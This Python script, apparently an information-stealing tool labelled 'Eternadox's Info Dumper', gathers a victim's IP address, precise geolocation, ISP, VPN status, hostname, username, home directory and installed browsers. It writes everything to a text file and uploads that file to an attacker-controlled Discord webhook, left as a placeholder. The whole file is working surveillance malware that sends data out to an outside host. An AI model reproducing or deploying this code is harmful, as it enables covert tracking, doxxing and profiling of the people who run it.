import requests
import os
import os.path
import getpass
import socket
import dhooks

LOCAL = os.getenv("LOCALAPPDATA")
TEMP = os.getenv("TEMP")
ROAMING = os.getenv("APPDATA")

def installedBrowser():
    chrome = False
    brave = False
    if os.path.exists(LOCAL + r'\BraveSoftware\Brave-Browser\User Data\default\Login Data'):
        brave = True
    if os.path.exists(LOCAL + r'\Google\Chrome\User Data\Local State'):
        chrome = True
    if chrome is True & brave is True:
        return "Chrome and Brave"
    elif chrome is True:
        return "Chrome"
    elif brave is True:
        return "Brave"

dir_path = os.path.dirname(os.path.realpath(__file__))
os.system(f'cd {dir_path}')
BROWSER = installedBrowser()
IPLINK = "https://api.ipify.org/?format=json"
GEOLINK = "http://ip-api.com/json/"
VPNLink = "https://vpn-proxy-detection.ipify.org/api/v1?apiKey={YOUR API KEY}&ipAddress="
IFCONFIG = "https://ifconfig.me/all.json"
HOSTNAME = socket.gethostname()
USERNAME = getpass.getuser()
HOMEDIR = os.path.expanduser("~")
WEBHOOKURL = "webhook url here"

r = requests.get(url = IPLINK)
data = r.json()
IP = data['ip']

req = requests.get(url = GEOLINK + IP)
data2 = req.json()

req2 = requests.get(url = VPNLink + IP)
data3 = req2.json()

req3 = requests.get(url = IFCONFIG)
data4 = req3.json()

USERAGENT = data4["user_agent"] # user agent is useless due to request using python requests
VPN = data3["proxy"]["vpn"]
COUNTRY = data2["countryCode"]
CITY = data2["city"] + ", "+ data2["region"]
LATITUDE = data2["lat"]
LONGITUDE = data2["lon"]
ZIP = data2["zip"]
TIMEZONE = data2["timezone"]
ISP = data2["isp"]
REGION = data2["regionName"]
infodump = f"""Country: {COUNTRY}
City: {CITY}
Latitude: {LATITUDE}
Longitude: {LONGITUDE}
ZIP Code: {ZIP}
Timezone: {TIMEZONE}
ISP: {ISP}
Region: {REGION}
IP: {IP}
Hostname: {HOSTNAME}
Username: {USERNAME}
Home Directory: {HOMEDIR}
Browser: {BROWSER}
VPN: {VPN}
User Agent: {USERAGENT}
======== INFO DUMP from Eternadox's Info Dumper ========
"""
f = open(f"InfoDumped{USERNAME}.txt", "w")
f.write(infodump)
f.close()

from dhooks import Webhook, File
from io import BytesIO
import requests

hook = Webhook("WEBHOOK URL")

file = File(f'{dir_path}\InfoDumped{USERNAME}.txt', name=f'InfoDumped{USERNAME}.txt')

hook.send('New Info Dump!', file=file)
